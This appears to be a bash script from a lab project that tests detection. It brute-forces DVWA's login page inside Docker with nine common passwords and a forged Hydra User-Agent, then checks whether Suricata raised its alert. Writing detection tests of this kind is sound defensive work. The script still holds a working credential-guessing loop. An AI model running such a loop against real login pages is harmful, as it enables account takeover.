#!/usr/bin/env bash
# ============================================================
# Ataque 2: Fuerza Bruta contra login de DVWA
#
# Detecta: Suricata rule 1000050 (User-Agent Hydra)
# Backup: Suricata rule 1000050 si usamos Hydra
# Tambien: Muchas requests HTTP a /login.php (rate anomaly)
# ============================================================
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"

VICTIM_IP="10.10.10.40"
SOURCE_CONTAINER="attacker"

# Credenciales validas e invalidas de DVWA
USERNAME="admin"
WORDLIST="password admin 123456 admin123 letmein root toor dvwa P@ssw0rd"

echo "============================================================"
echo " ATAQUE 2: Fuerza Bruta (diccionario)"
echo "============================================================"
echo "Objetivo: $VICTIM_IP:80/login.php (DVWA)"
echo "Usuario:  $USERNAME"
echo "Wordlist: 9 passwords"
echo ""

# Simula hydra: hace POST a login.php con cada password
# El User-Agent "hydra" dispara la regla 1000050 de Suricata
echo "[+] Enviando 9 intentos de login con User-Agent Hydra..."
for password in $WORDLIST; do
    docker exec "$SOURCE_CONTAINER" curl -s --max-time 15 \
        -A "hydra/9.5 (https://github.com/vanhauser-thc/thc-hydra)" \
        -X POST \
        -d "username=$USERNAME&password=$password&Login=Login" \
        -o /dev/null -w "Password '$password': HTTP %{http_code}\n" \
        "http://$VICTIM_IP/login.php"
    sleep 0.5
done

echo ""
echo "[OK] Ataque de fuerza bruta completado"
sleep 5

# Verificar
if docker exec suricata grep -q '"signature_id":1000050' /var/log/suricata/eve.json 2>/dev/null; then
    echo "[OK] Alerta Suricata 1000050 (Hydra) DETECTADA"
else
    echo "[--] Aun no se detecta la alerta (esperar unos segundos)"
fi